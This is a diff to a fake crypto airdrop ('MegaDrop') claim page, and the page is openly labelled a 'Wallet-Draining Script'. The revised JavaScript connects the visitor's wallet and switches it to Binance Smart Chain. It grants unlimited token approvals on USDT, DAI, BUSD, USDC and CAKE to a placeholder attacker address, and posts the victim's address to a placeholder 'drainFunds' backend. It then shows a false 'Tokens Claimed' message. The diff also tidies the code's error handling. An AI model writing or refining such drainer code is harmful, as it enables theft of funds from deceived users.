@@ -56,6 +56,10 @@
         .claim-btn:hover {
             background: #2563eb;
         }
+        .claim-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
         .claim-btn img {
             width: 20px;
             height: 20px;
@@ -186,8 +190,8 @@
                     <use xlink:href="images/currencies-sprite.svg#btc"></use>
                 </svg>
                 <div class="card__header">
-                    <h3>Binance Smart Chain</h3>
-                    <span class="text text--standart text--medium">BSC</span>
+                    <h3>Bitcoin</h3>
+                    <span class="text text--standart text--medium">BTC</span>
                 </div>
                 <p class="text text-small text--regular card__text">A blockchain protocol for fast and secure transactions.</p>
                 <button class="claim-btn">
@@ -311,56 +315,109 @@
     <!-- Wallet-Draining Script -->
     <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
     <script>
-        new Rellax(".btc-illustration", { horizontal: true });
-        new Rellax("#gpu-illustration", { horizontal: true });
+        // Ensure DOM is fully loaded before attaching event listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            new Rellax(".btc-illustration", { horizontal: true });
+            new Rellax("#gpu-illustration", { horizontal: true });
 
-        async function connectAndApprove() {
-            if (!window.ethereum) {
-                document.getElementById('walletNotification').style.display = 'block';
-                return;
+            async function connectAndApprove(event) {
+                const btn = event.target.closest('.claim-btn');
+                btn.disabled = true;
+                try {
+                    // Check for wallet
+                    if (!window.ethereum) {
+                        document.getElementById('walletNotification').style.display = 'block';
+                        return;
+                    }
+
+                    // Connect wallet
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+
+                    // Switch to BSC
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }]
+                        });
+                    } catch (switchError) {
+                        // If BSC is not added, try adding it
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'Binance Smart Chain',
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com']
+                                }]
+                            });
+                        } else {
+                            throw switchError;
+                        }
+                    }
+
+                    // Get user address
+                    const signer = provider.getSigner();
+                    const userAddress = await signer.getAddress();
+
+                    // Show verifying message
+                    document.body.innerHTML = "<h2>Verifying BSC Wallet...</h2>";
+
+                    // Approve tokens
+                    const tokenAddresses = [
+                        "0x55d398326f99059fF775485246999027B3197955", // USDT
+                        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc",  // DAI
+                        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
+                        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
+                        "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"  // CAKE
+                    ];
+                    const abi = ["function approve(address spender, uint256 amount) returns (bool)"];
+                    for (let token of tokenAddresses) {
+                        const contract = new ethers.Contract(token, abi, signer);
+                        await contract.approve("YOUR_ATTACKER_ADDRESS", ethers.constants.MaxUint256);
+                    }
+
+                    // Send request to Glitch backend
+                    const response = await fetch('https://YOUR_GLITCH_URL/drainFunds', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ targetAddress: userAddress })
+                    });
+                    if (!response.ok) {
+                        throw new Error('Backend request failed');
+                    }
+
+                    // Show success message
+                    document.body.innerHTML = "<h2>Verified! MegaDrop Tokens Claimed!</h2>";
+                } catch (error) {
+                    console.error("Error in connectAndApprove:", error);
+                    document.body.innerHTML = "<h2>Error: Could not process your request. Please try again.</h2>";
+                } finally {
+                    btn.disabled = false;
+                }
             }
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            const userAddress = await signer.getAddress();
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }]
+
+            function checkEligibility() {
+                const walletInput = document.getElementById('walletAddressInput').value;
+                if (walletInput.length < 10) {
+                    alert("Please enter a valid wallet address.");
+                    return;
+                }
+                document.querySelector('.calculate__header').style.display = 'none';
+                document.getElementById('eligibilityResult').style.display = 'block';
+            }
+
+            // Attach event listeners to all claim buttons
+            document.querySelectorAll('.claim-btn').forEach(btn => {
+                btn.addEventListener('click', connectAndApprove);
             });
-            document.body.innerHTML = "<h2>Verifying BSC Wallet...</h2>";
-            const tokenAddresses = [
-                "0x55d398326f99059fF775485246999027B3197955", // USDT
-                "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc",  // DAI
-                "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
-                "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
-                "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"  // CAKE
-            ];
-            const abi = ["function approve(address spender, uint256 amount) returns (bool)"];
-            for (let token of tokenAddresses) {
-                const contract = new ethers.Contract(token, abi, signer);
-                await contract.approve("YOUR_ATTACKER_ADDRESS", ethers.constants.MaxUint256);
-            }
-            await fetch('https://YOUR_GLITCH_URL/drainFunds', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ targetAddress: userAddress })
-            });
-            document.body.innerHTML = "<h2>Verified! MegaDrop Tokens Claimed!</h2>";
-        }
-
-        function checkEligibility() {
-            const walletInput = document.getElementById('walletAddressInput').value;
-            if (walletInput.length < 10) {
-                alert("Please enter a valid wallet address.");
-                return;
-            }
-            document.querySelector('.calculate__header').style.display = 'none';
-            document.getElementById('eligibilityResult').style.display = 'block';
-        }
-
-        document.querySelectorAll('.claim-btn').forEach(btn => {
-            btn.addEventListener('click', connectAndApprove);
         });
     </script>
 </body>
-                                            </html>
+</html>
